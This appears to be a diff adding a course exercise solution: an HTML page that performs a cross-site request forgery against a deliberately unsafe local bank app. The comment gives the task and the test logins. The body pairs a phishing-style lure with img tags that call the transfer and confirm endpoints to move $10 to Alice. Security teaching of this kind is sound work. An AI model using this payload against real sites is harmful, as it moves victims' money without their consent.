@@ -1,0 +1,26 @@
+<!--
+The exercise contains an unsafe bank application that uses GET methods without any CSRF protection.
+
+The application has the following username and password combinations for testing:
+
+    alice:redqueen
+    bob:squarepants
+
+Write an HTML file that when opened (if the user is logged in) moves $10 to Alice's account. Note that there is a confirmation dialog which you also need to deal with.
+
+Do not use Javascript, instead use img tags.
+
+The automated test will ignore the DNS name of the server in img tags, so you can use localhost:8000 freely, or any other name, depending on your setup.
+-->
+<html>
+
+<body>
+Dear Sir.<br/>
+
+I would like you to present you with this great opportunity.
+<img src="http://localhost:8000/transfer/?to=alice&amount=10">
+<img src="http://localhost:8000/confirm/?">
+
+</body>
+
+</html>
